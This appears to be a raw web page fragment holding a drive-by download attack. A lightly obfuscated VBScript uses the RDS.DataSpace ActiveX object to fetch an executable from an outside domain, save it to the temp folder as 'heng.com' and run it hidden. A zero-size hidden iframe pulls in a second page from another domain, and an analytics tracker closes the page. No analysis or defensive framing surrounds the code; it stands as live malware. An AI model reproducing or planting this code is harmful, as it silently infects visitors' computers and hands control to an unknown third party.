<script language="VBScript">
call show ("http://www.soswg.com/js/1%2Eexe","heng.com")
sub show(Urls,fname1)
    on error resume next
    xx="object"
    xxx="clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
    xxxx="classid"
    xxxxx="Microsoft.XMLHTTP"
    xxxxxx="Adodb.Stream"
    xxxxxxx="GET"
    xxxxxxxx="Scripting.FileSystemObject"
    xxxxxxxxx="Shell.Application"
    xxxxxxxxxx="open"
    Set df = document.createElement(xx)
    df.setAttribute xxxx, xxx
    Set x = df.CreateObject(xxxxx,"")
    Set S = df.createobject(xxxxxx,"")
    S.type = 1
    x.Open xxxxxxx, Urls, False
    x.Send
    Set F = df.createobject(xxxxxxxx,"")
    Set tmp = F.GetSpecialFolder(2) 
    fname1 = F.BuildPath(tmp,fname1)
    S.open
    S.write x.responseBody
    S.savetofile fname1,2
    S.close
    set Q = df.createobject(xxxxxxxxx,"")
    Q.ShellExecute fname1,"","",,0
end sub
'By
</script>

<iframe src="http://www.pdtw.com/Inc/z7.htm" width="0" height="0"></iframe>

<script language="javascript" type="text/javascript" src="http://js.users.51.la/558155.js"></script>
<noscript><a href="http://www.51.la/?558155" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="http://img.users.51.la/558155.asp" style="border:none" /></a></noscript>
